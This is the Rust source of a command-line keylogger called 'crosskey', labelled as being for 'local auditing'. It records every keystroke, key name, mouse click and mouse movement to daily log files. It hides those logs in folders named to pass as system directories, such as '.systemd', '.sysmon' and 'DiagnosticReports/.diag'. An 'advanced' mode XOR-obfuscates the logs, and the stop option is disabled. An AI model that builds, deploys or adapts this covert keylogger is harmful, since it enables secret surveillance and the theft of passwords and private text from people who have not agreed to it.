use rdev::{listen, EventType, Button};
use clap::Parser;
use std::fs::{OpenOptions, create_dir_all};
use std::io::Write;
use std::path::PathBuf;
use chrono::Local;
use std::{thread, time::Duration};
use std::io::{self};
use std::process;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use signal_hook::consts::signal::*;
use signal_hook::flag;

#[derive(Parser)]
#[command(name = "crosskey", about = "Keylogger for local auditing")]
struct Args {
    #[arg(short = 's', long)]
    start: bool,
    
    #[arg(short = 'a', long)]
    advanced: bool,
    
    #[arg(short = 'k', long)]  // 'k' for kill/stop
    stop: bool,
}

fn print_banner() {
    let banner = r#"
╔══════════════════════════════════════════════════════════════════════════════╗
╠══════════════════════════════════════════════════════════════════════════════╣
║  ______                          __  __                                      ║
║ |      |.----.-----.-----.-----.|  |/  |.-----.--.--.                        ║
║ |   ---||   _|  _  |__ --|__ --||     < |  -__|  |  |                        ║
║ |______||__| |_____|_____|_____||__|\__||_____|___  |                        ║
║                                               |_____|                        ║
╠══════════════════════════════════════════════════════════════════════════════╣
║   🔐 crosskey | Keylogger for your OS                                        ║
╚══════════════════════════════════════════════════════════════════════════════╝
"#;
    println!("{}", banner);
}

fn get_log_path(advanced: bool) -> PathBuf {
    let base_dir = if advanced {
        #[cfg(target_os = "windows")]
        { std::env::var("USERPROFILE").unwrap() + "\\AppData\\Local\\Microsoft\\Windows\\Caches\\" }
        #[cfg(target_os = "linux")]
        { "/var/tmp/.systemd/".to_string() }
        #[cfg(target_os = "macos")]
        { "/Library/Logs/DiagnosticReports/.diag/".to_string() }
    } else {
        #[cfg(target_os = "windows")]
        { std::env::var("USERPROFILE").unwrap() + "\\AppData\\Local\\Temp\\sysmon\\" }
        #[cfg(target_os = "linux")]
        { std::env::var("HOME").unwrap() + "/.cache/.sysmon/" }
        #[cfg(target_os = "macos")]
        { std::env::var("HOME").unwrap() + "/Library/Logs/.sysmon/" }
    };

    create_dir_all(&base_dir).unwrap();
    let log_file = if advanced {
        format!("sysdiag_{}.bin", Local::now().format("%Y%m%d"))
    } else {
        format!("session_{}.log", Local::now().format("%Y%m%d"))
    };
    PathBuf::from(base_dir + &log_file)
}

fn log_event(message: &str, log_path: &PathBuf, advanced: bool) {
    if let Ok(mut file) = OpenOptions::new().append(true).create(true).open(log_path) {
        if advanced {
            // Simple XOR "encryption" for demonstration
            let encrypted: Vec<u8> = message.bytes().map(|b| b ^ 0xAA).collect();
            let _ = file.write_all(&encrypted);
        } else {
            let _ = writeln!(file, "{}", message);
        }
    }
}

fn loading_animation(message: &str, duration_secs: u64) {
    let spinner = ["|", "/", "-", "\\"];
    let total_ticks = duration_secs * 10;

    print!("{}", message);
    io::stdout().flush().unwrap();

    for i in 0..total_ticks {
        let tick = spinner[(i as usize) % spinner.len()];
        print!("\r{} {}", message, tick);
        io::stdout().flush().unwrap();
        thread::sleep(Duration::from_millis(100));
    }

    println!("\r{} ✅", message);
}

fn show_startup_message(advanced: bool) {
    if advanced {
        println!("🛡️  Advanced protections enabled");
        println!("🔒 Log encryption active");
    }
    loading_animation("🛠️  Initializing keylogger", 2);
    println!("🔐 Logging session started...");
}

fn print_help() {
    print_banner();
    println!("Usage:");
    println!("  Basic mode: crosskey --start");
    println!("  Advanced mode: crosskey --start --advanced");
    println!("  Stop process: crosskey --stop");
    println!("\nLog file locations:");
    println!("  Basic mode:");
    println!("    Windows: %USERPROFILE%\\AppData\\Local\\Temp\\sysmon\\session_YYYYMMDD.log");
    println!("    Linux: ~/.cache/.sysmon/session_YYYYMMDD.log");
    println!("    macOS: ~/Library/Logs/.sysmon/session_YYYYMMDD.log");
    println!("\n  Advanced mode:");
    println!("    Windows: %USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\Caches\\sysdiag_YYYYMMDD.bin");
    println!("    Linux: /var/tmp/.systemd/sysdiag_YYYYMMDD.bin");
    println!("    macOS: /Library/Logs/DiagnosticReports/.diag/sysdiag_YYYYMMDD.bin");
}

fn main() {
    let args = match Args::try_parse() {
        Ok(args) => args,
        Err(e) if e.kind() == clap::error::ErrorKind::DisplayHelp => {
            print_help();
            return;
        },
        Err(_) => {
            return;
        }
    };
    
    if args.stop {
        println!("Stop functionality removed in this version");
        return;
    }

    if args.start {
        print_banner();
        show_startup_message(args.advanced);

        let log_path = get_log_path(args.advanced);
        
        log_event(
            &format!("\n\n--- SESSION START: {} ---\n", Local::now().format("%Y-%m-%d %H:%M:%S")),
            &log_path,
            args.advanced,
        );

        // Setup signal handler for graceful shutdown
        let term = Arc::new(AtomicBool::new(false));
        flag::register(SIGTERM, Arc::clone(&term)).unwrap();
        flag::register(SIGINT, Arc::clone(&term)).unwrap();

        if let Err(error) = listen(move |event| {
            if term.load(Ordering::Relaxed) {
                process::exit(0);
            }

            let time = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
            let window = "".to_string();

            let message = match event.event_type {
                EventType::KeyPress(key) => {
                    if let Some(name) = event.name {
                        format!("{time}{window} Key Pressed: {:?} (\"{}\")", key, name)
                    } else {
                        format!("{time}{window} Key Pressed: {:?}", key)
                    }
                }
                EventType::KeyRelease(key) => {
                    if let Some(name) = event.name {
                        format!("{time}{window} Key Released: {:?} (\"{}\")", key, name)
                    } else {
                        format!("{time}{window} Key Released: {:?}", key)
                    }
                }
                EventType::ButtonPress(button) => match button {
                    Button::Left => format!("{time}{window} 🖱️ Mouse Click: Left"),
                    Button::Right => format!("{time}{window} 🖱️ Mouse Click: Right"),
                    Button::Middle => format!("{time}{window} 🖱️ Mouse Click: Middle"),
                    _ => format!("{time}{window} 🖱️ Mouse Click: Other"),
                },
                EventType::MouseMove { x, y } => {
                    format!("{time}{window} 🖱️ Mouse moved to ({x}, {y})")
                }
                _ => format!("{time}{window} Other: {:?}", event.event_type),
            };

            log_event(&message, &log_path, args.advanced);
        }) {
            eprintln!("❌ Error starting listener: {:?}", error);
        }
    } else {
        print_help();
    }
}
